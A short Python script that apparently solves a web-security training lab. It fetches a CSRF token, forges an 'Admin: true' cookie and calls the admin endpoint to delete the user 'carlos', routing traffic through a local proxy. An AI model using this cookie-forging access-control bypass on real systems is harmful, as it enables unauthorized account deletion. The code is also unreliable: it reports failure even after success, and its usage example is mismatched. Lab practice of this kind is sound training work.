import re
import sys

from typing import Optional, cast

import requests
import urllib3
from bs4 import BeautifulSoup
from bs4.element import Tag
from colorama import Fore

# import urllib.parse
# from requests.exceptions import RequestException

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def go_to_login_for_cfrs(session):
    r = session.get(url + "login", proxies=proxies, verify=False, timeout=5)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf: Optional[Tag] = cast(Tag, soup.find("input", type="hidden"))

    if csrf is not None:
        print(f"{Fore.GREEN}[+] CSRF token: {csrf['value']}{Fore.RESET}")
        return csrf["value"]

    return "not csrf token"


def take_cookie(session):
    r = session.get(url, verify=False, proxies=proxies, timeout=5)
    session_cookie = r.cookies.get("session")
    admin_cookie = r.cookies.get("Admin")
    return {"session": session_cookie, "Admin": admin_cookie}


def delete_carlos(session, cookies, csfr_token):
    delete_command = "delete?username=carlos"
    full_url = url + "admin/" + delete_command
    print(full_url)
    cookies = {"session": cookies.get("session"), "Admin": "true"}
    data = {"csrf": csfr_token, "username": "wiener", "password": "peter"}
    r = session.get(
        full_url, cookies=cookies, data=data, verify=False, proxies=proxies, timeout=5
    )
    r.raise_for_status()
    print(f"{Fore.YELLOW}status code: {r.status_code}{Fore.RESET}")
    if r.status_code == 302:
        print(f"{Fore.GREEN}[-] Carlos deleted{Fore.RESET}")
    print(f"{Fore.RED}[-] Carlos not deleted{Fore.RESET}")


def exploit(session):
    csfr_token = go_to_login_for_cfrs(session)
    cookies = take_cookie(session)
    delete_carlos(session, cookies, csfr_token)


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print(f"{Fore.RED}[-] Usage: {sys.argv[0]} <url>{Fore.RESET}")
        print(
            f'[-] Example: {sys.argv[0]} USER_NAME = "administrator" TABLE_NAME = "users" COLUMN_NAME = "username""'
        )
        sys.exit(-1)

    print("[*] Exploiting...")
    s = requests.Session()
    exploit(s)
